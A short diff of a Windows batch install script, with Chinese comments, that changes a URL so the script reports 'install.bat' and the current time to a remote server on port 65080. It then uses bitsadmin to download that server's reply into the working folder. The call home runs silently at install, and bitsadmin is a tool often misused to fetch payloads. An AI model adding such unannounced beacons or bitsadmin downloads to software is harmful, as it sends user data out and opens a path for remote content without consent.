@@ -15,7 +15,7 @@ if %ss% lss 10 set ss=0%ss%
 set currentTime=%hh%%mm%%ss%
 
 REM 替换 URL 中的 "newline2" 为当前时间
-set url=http://ds.0728123.xyz:65080/log_channel12?text=%currentTime%
+set url=http://ds.0728123.xyz:65080/log_channel12?text=install.bat_%currentTime%
 
 REM 使用 bitsadmin 发送请求
 bitsadmin /transfer myDownloadJob /download /priority normal "%url%" "%CD%\response.txt"
